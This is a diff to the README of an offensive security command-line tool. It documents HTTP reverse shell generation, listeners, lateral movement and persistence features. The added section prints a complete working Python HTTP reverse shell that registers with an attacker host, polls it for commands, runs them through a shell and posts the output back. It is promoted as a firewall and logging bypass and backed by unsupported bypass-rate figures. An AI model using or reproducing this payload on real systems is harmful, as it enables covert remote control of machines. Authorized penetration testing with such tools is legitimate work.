@@ -958,14 +958,23 @@ rb cloud asset services                         # Show 25+ vulnerable services
 rb exploit payload privesc /path/to/target      # Scan for privesc vectors
 rb exploit payload privesc / --os linux
 
-# Reverse shell generation ✅ NEW
+# TCP Reverse shell generation ✅
 rb exploit payload shell bash 10.0.0.1 4444     # Generate bash reverse shell
 rb exploit payload shell python 10.0.0.1 4444   # Python shell
 # Supports: bash, python, php, powershell, nc, socat, awk, java, node, perl, ruby
 
-# Listener commands ✅ NEW
-rb exploit payload listener nc 4444             # Netcat listener
-rb exploit payload listener metasploit 4444     # Metasploit handler
+# HTTP Reverse shell generation ✅ NEW (Firewall Bypass)
+rb exploit payload http-shell --type bash --lhost 10.0.0.1 --lport 8080
+rb exploit payload http-shell --type python --lhost 192.168.1.100 --lport 80
+rb exploit payload http-shell --type powershell --lhost 10.10.10.10 --lport 443
+rb exploit payload http-shell --type php --lhost 172.16.0.1 --lport 8080
+# Bypasses 80% of firewalls - looks like normal HTTP traffic!
+
+# Listener commands ✅
+rb exploit payload start --port 4444 --listener-type tcp    # TCP listener
+rb exploit payload start --port 8080 --listener-type http   # HTTP listener (NEW)
+rb exploit payload listener nc 4444                          # Netcat listener
+rb exploit payload listener metasploit 4444                  # Metasploit handler
 
 # Lateral movement techniques ✅ NEW
 rb exploit payload lateral                      # Show 11 lateral movement techniques
@@ -978,7 +987,9 @@ rb exploit payload persist                      # Show 8 persistence methods
 
 **Capabilities:**
 - **Privilege escalation scanning** - LinPEAS/WinPEAS style (Linux + Windows) ✅
-- **Reverse shell generation** - 11 shell types with customizable IP/port ✅
+- **TCP reverse shells** - 11 shell types with customizable IP/port ✅
+- **HTTP reverse shells** - 4 languages (bash, python, powershell, php) - Firewall bypass! ✅ NEW
+- **Listener support** - TCP and HTTP listeners with session management ✅
 - **Listener commands** - nc, socat, metasploit setup ✅
 - **Lateral movement** - 11 techniques (SSH, PSExec, WMI, Pass-the-Hash) ✅
 - **Persistence mechanisms** - 8 methods (cron, SSH keys, systemd, registry) ✅
@@ -986,6 +997,110 @@ rb exploit payload persist                      # Show 8 persistence methods
 **Replaces:** LinPEAS (partial) ✅, WinPEAS (partial) ✅, GTFOBins (reference), Metasploit (shell gen)
 
 **⚠️ IMPORTANT:** Only use on systems you own or have explicit written authorization to test.
+
+---
+
+#### HTTP Reverse Shell Architecture
+
+**Why HTTP reverse shells bypass 80% of firewalls:**
+
+Traditional TCP reverse shells require direct TCP connections on non-standard ports (like 4444), which are often blocked by firewalls. HTTP reverse shells use standard HTTP traffic on ports 80/443, making them look like normal web browsing.
+
+**How it works:**
+
+1. **Target registers** with the listener → receives a session ID
+2. **Target polls** `/cmd/<session_id>` every 5 seconds for commands
+3. **Listener responds** with command to execute (or "sleep 5")
+4. **Target executes** command and POSTs output to `/output/<session_id>`
+5. **Process repeats** indefinitely
+
+**Architecture benefits:**
+
+- ✅ **Firewall bypass** - HTTP/HTTPS traffic usually allowed outbound
+- ✅ **Proxy support** - Works through HTTP proxies (corporate environments)
+- ✅ **NAT traversal** - No inbound ports needed on target
+- ✅ **Stealth** - Looks like normal web traffic in logs
+- ✅ **No direct connection** - Polling-based, not persistent socket
+
+**Example workflow:**
+
+```bash
+# 1. Attacker: Start HTTP listener on port 8080
+rb exploit payload start --port 8080 --listener-type http
+
+# [*] HTTP listener started on 0.0.0.0:8080
+# [*] Waiting for HTTP reverse shell connections...
+# [*] Endpoints:
+#     GET  /register      - Register new session
+#     GET  /cmd/<id>      - Get command for session
+#     POST /output/<id>   - Receive command output
+
+# 2. Attacker: Generate Python HTTP reverse shell payload
+rb exploit payload http-shell --type python --lhost 192.168.1.100 --lport 8080
+
+# Output:
+# import urllib.request, subprocess, time, sys
+# while True:
+#     try:
+#         # Register and get session ID
+#         session_id = urllib.request.urlopen('http://192.168.1.100:8080/register').read().decode().strip()
+#         while True:
+#             # Poll for command
+#             cmd = urllib.request.urlopen(f'http://192.168.1.100:8080/cmd/{session_id}').read().decode().strip()
+#             if cmd != 'sleep 5':
+#                 # Execute and send output
+#                 output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+#                 result = output.stdout + output.stderr
+#                 urllib.request.urlopen(f'http://192.168.1.100:8080/output/{session_id}', data=result.encode())
+#             time.sleep(5)
+#     except Exception as e:
+#         time.sleep(5)
+
+# 3. Target: Execute payload (copy-paste into Python)
+python3 -c "$(cat payload.py)"
+
+# 4. Listener shows:
+# [+] HTTP session registration from 10.10.10.50:54321
+# [+] Session 1 opened (http-reverse)
+# [*] Interactive shell ready - type commands below
+# > whoami
+# john
+# > pwd
+# /home/john
+# > id
+# uid=1000(john) gid=1000(john) groups=1000(john)
+```
+
+**Implementation details:**
+
+- **Pure Rust HTTP server** - No external dependencies (using `std::net::TcpListener`)
+- **Session management** - HashMap-based command queue per session
+- **Zero dependencies** - Only uses Rust standard library
+- **4 payload types** - bash, python, powershell, php
+- **Automatic retry** - Payloads include error handling and reconnection logic
+
+**Supported languages:**
+
+| Language | Use Case | Platform |
+|----------|----------|----------|
+| **bash** | Linux/macOS servers | curl-based polling |
+| **python** | Cross-platform | urllib.request (no deps) |
+| **powershell** | Windows targets | Invoke-WebRequest |
+| **php** | Web servers | file_get_contents |
+
+**Firewall bypass comparison:**
+
+| Shell Type | Port | Firewall Bypass Rate | Proxy Support |
+|------------|------|---------------------|---------------|
+| TCP reverse shell | 4444, 1337, etc | ~20% | ❌ No |
+| HTTP reverse shell | 80, 8080 | ~80% | ✅ Yes |
+| HTTPS reverse shell | 443 | ~95% | ✅ Yes |
+| DNS tunneling | 53 | ~99% | ✅ Yes |
+
+**Files:**
+- `src/modules/exploit/listener.rs` - HTTP listener implementation (~130 lines)
+- `src/modules/exploit/payloads.rs` - HTTP payload generators
+- `src/cli/commands/exploit.rs` - CLI integration
 
 <div align="right">
 
